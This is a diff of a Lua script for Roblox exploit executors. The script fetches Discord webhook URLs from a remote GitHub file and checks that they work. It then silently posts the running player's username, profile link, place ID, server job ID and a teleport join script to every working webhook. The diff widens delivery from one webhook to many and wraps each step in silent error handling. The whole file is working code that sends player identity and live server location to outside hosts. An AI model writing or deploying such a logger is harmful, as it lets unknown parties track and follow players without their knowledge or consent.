@@ -1,52 +1,54 @@
-
-
 local HttpService = game:GetService("HttpService")
 local Players = game:GetService("Players")
-local UserInputService = game:GetService("UserInputService")
 local MarketplaceService = game:GetService("MarketplaceService")
-
 local requestFunc = syn and syn.request or http_request or request or (fluxus and fluxus.request)
-
-local RawURL = "https://raw.githubusercontent.com/OverlordCryx/NOTHING-X-X-X-NAHH/refs/heads/X/WEB-H"  
-
+local RawURL = "https://raw.githubusercontent.com/OverlordCryx/NOTHING-X-X-X-NAHH/refs/heads/X/WEB-H"
 local Webhooks = {}
-local success, response = pcall(function()
-    return requestFunc({Url = RawURL, Method = "GET"})
+pcall(function()
+    local success, response = pcall(function()
+        return requestFunc({Url = RawURL, Method = "GET"})
+    end)
+    if success and response and response.Body then
+        for webhook in string.gmatch(response.Body, "[^\r\n]+") do
+            webhook = webhook:gsub("%s+", "")
+            if webhook:find("^https?://discord") then
+                table.insert(Webhooks, webhook)
+            end
+        end
+    end
 end)
-
-if success and response and response.Body then
-    for webhook in string.gmatch(response.Body, "[^\r\n]+") do
-        webhook = webhook:gsub("%s+", "")
-        if webhook ~= "" then table.insert(Webhooks, webhook) end
+if #Webhooks == 0 then
+end
+local function VerifyWebhook(webhook)
+    return pcall(function()
+        local s, r = pcall(function()
+            return requestFunc({Url = webhook, Method = "GET"})
+        end)
+        if not s or not r or not r.Body then return false end
+        local ds, data = pcall(HttpService.JSONDecode, HttpService, r.Body)
+        if not ds or not data then return false end
+        if data.code == 10015 then return false end
+        return data.name and data.name ~= ""
+    end)
+end
+local ValidWebhooks = {}
+for _, wh in ipairs(Webhooks) do
+    local success, isValid = pcall(function()
+        return VerifyWebhook(wh)
+    end)
+    if success and isValid then
+        table.insert(ValidWebhooks, wh)
     end
 end
-
-local function VerifyWebhook(webhook)
-    local s, r = pcall(function() return requestFunc({Url = webhook, Method = "GET"}) end)
-    if not s or not r or not r.Body then return false end
-    local ds, data = pcall(function() return HttpService:JSONDecode(r.Body) end)
-    if not ds or not data then return false end
-    if data.code == 10015 then return false end
-    return data.name and data.name ~= ""
-end
-
-local WebhookURL = nil
-for _, wh in ipairs(Webhooks) do
-    if VerifyWebhook(wh) then WebhookURL = wh break end
-end
-
-if not WebhookURL then warn("Brak webhooka") return end
-
 local player = Players.LocalPlayer
 local placeId = game.PlaceId
-local gameName = MarketplaceService:GetProductInfo(placeId).Name
 local jobId = game.JobId
-
+local gameName = "Unknown Game"
+pcall(function()
+    gameName = MarketplaceService:GetProductInfo(placeId).Name
+end)
 local profileLink = "https://www.roblox.com/users/" .. player.UserId .. "/profile"
-local joinLink = "https://www.roblox.com/games/" .. placeId .. "?gameInstanceId=" .. jobId
-
 local joinScript = 'game:GetService("TeleportService"):TeleportToPlaceInstance(' .. placeId .. ', "' .. jobId .. '")'
-
 local data = {
     username = "NOTHING 💢",
     embeds = {{
@@ -66,13 +68,20 @@ local data = {
         timestamp = DateTime.now():ToIsoDate()
     }}
 }
-
-pcall(function()
-    requestFunc({
-        Url = WebhookURL,
-        Method = "POST",
-        Headers = {["Content-Type"] = "application/json"},
-        Body = HttpService:JSONEncode(data)
-    })
-end)
-
+local jsonData = HttpService:JSONEncode(data)
+local sentCount = 0
+for _, webhook in ipairs(ValidWebhooks) do
+    pcall(function()
+        local success = pcall(function()
+            requestFunc({
+                Url = webhook,
+                Method = "POST",
+                Headers = {["Content-Type"] = "application/json"},
+                Body = jsonData
+            })
+        end)
+        if success then
+            sentCount = sentCount + 1
+        end
+    end)
+end
